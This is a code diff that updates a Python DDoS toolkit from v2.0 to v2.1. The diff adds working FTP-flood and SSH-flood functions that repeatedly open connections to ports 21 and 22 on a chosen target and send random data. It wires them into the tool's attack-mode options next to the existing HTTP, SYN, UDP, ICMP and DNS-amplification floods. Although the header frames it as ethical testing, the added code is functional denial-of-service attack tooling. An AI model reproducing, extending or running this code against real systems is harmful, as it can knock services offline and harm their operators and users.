@@ -10,7 +10,7 @@
 # Description:       A toolkit designed for simulating various types of Distributed Denial of Service (DDoS) attacks for ethical cybersecurity testing.
 # Author:
 # + LIONMAD <https://github.com/Midohajhouj>
-# Version:           v2.0
+# Version:           v2.1
 # License:           MIT License - https://opensource.org/licenses/MIT
 ### END INIT INFO
 
@@ -90,7 +90,7 @@ def display_banner():
 {BLUE}
 ████████████████████████████████████████████████████████
 ██                                                             ██
-██             DDoS Toolkit v2.0 Coded by LIONMAD              ██
+██             DDoS Toolkit v2.1 Coded by LIONMAD              ██
 ██        USE WITH CAUTION, PROCEED AT YOUR OWN RISK.          ██                                  
 ██                LIONMAD SALUTES YOU LIONMAD                  ██
 ██        LIONMAD SALUTES YOU      LIONMAD SALUTES YOU         ██
@@ -103,7 +103,7 @@ def display_banner():
 
 def parse_args():
     """Parse command-line arguments."""
-    parser = argparse.ArgumentParser(description="DDoS Toolkit v2.0 Coded By LIONBAD")
+    parser = argparse.ArgumentParser(description="DDoS Toolkit v2.1 Coded By LIONBAD")
     parser.add_argument("-u", "--url", required=True, help="Target URL or IP address")
     parser.add_argument("-s", "--scan", action="store_true", help="Perform a network scan using NetScan lib ")
     parser.add_argument("-t", "--threads", type=int, default=10, help="Number of threads")
@@ -114,7 +114,7 @@ def parse_args():
     parser.add_argument("--payload", choices=["json", "xml", "form"], default="json", help="Payload type")
     parser.add_argument("--results", help="File to save results (JSON)")
     parser.add_argument("--rate-limit", type=int, default=100, help="Rate limit for requests per second")
-    parser.add_argument("--attack-mode", choices=["http-flood", "slowloris", "udp-flood", "syn-flood", "icmp-flood", "dns-amplification"], default="http-flood", help="Type of attack to perform")
+    parser.add_argument("--attack-mode", choices=["http-flood", "slowloris", "udp-flood", "syn-flood", "icmp-flood", "dns-amplification", "ftp-flood", "ssh-flood"], default="http-flood", help="Type of attack to perform")
     parser.add_argument("--retry", type=int, default=3, help="Number of retries for failed requests")
     parser.add_argument("--user-agents", help="File containing custom user-agent strings")
     parser.add_argument("--multi-target", help="File containing multiple target URLs or IPs")
@@ -330,6 +330,40 @@ async def dns_amplification(target_ip, duration):
         time.sleep(0.01)  # Adjust the sleep time to control the attack rate
     print("DNS amplification attack completed.")
 
+def ftp_flood(target_ip, target_port, duration):
+    """Perform an FTP flood attack."""
+    print(f"Starting FTP flood attack on {target_ip}:{target_port} for {duration} seconds...")
+    start_time = time.time()
+    while time.time() - start_time < duration:
+        try:
+            # Create a socket and connect to the target FTP server
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.connect((target_ip, target_port))
+            # Send a random payload
+            sock.send(os.urandom(1024))
+            sock.close()
+        except Exception as e:
+            print(f"Error during FTP flood: {e}")
+        time.sleep(0.01)  # Adjust the sleep time to control the attack rate
+    print("FTP flood attack completed.")
+
+def ssh_flood(target_ip, target_port, duration):
+    """Perform an SSH flood attack."""
+    print(f"Starting SSH flood attack on {target_ip}:{target_port} for {duration} seconds...")
+    start_time = time.time()
+    while time.time() - start_time < duration:
+        try:
+            # Create a socket and connect to the target SSH server
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.connect((target_ip, target_port))
+            # Send a random payload
+            sock.send(os.urandom(1024))
+            sock.close()
+        except Exception as e:
+            print(f"Error during SSH flood: {e}")
+        time.sleep(0.01)  # Adjust the sleep time to control the attack rate
+    print("SSH flood attack completed.")
+
 async def http2_flood(target_url, stop_event, pause_time, rate_limit, proxies=None, headers=None, payload_type="json", retry=3):
     """Perform an HTTP/2 flood attack."""
     global requests_sent, successful_requests, failed_requests, last_time
@@ -512,6 +546,14 @@ async def main():
     elif args.attack_mode == "dns-amplification":
         target_ip = await resolve_target(target)
         threading.Thread(target=dns_amplification, args=(target_ip, args.duration)).start()
+    elif args.attack_mode == "ftp-flood":
+        target_ip = await resolve_target(target)
+        target_port = 21  # Default port for FTP
+        threading.Thread(target=ftp_flood, args=(target_ip, target_port, args.duration)).start()
+    elif args.attack_mode == "ssh-flood":
+        target_ip = await resolve_target(target)
+        target_port = 22  # Default port for SSH
+        threading.Thread(target=ssh_flood, args=(target_ip, target_port, args.duration)).start()
     elif args.attack_mode == "http2-flood":
         for _ in range(args.threads):
             task = asyncio.create_task(http2_flood(args.url, stop_event, args.pause, args.rate_limit, proxies, headers, args.payload, args.retry))
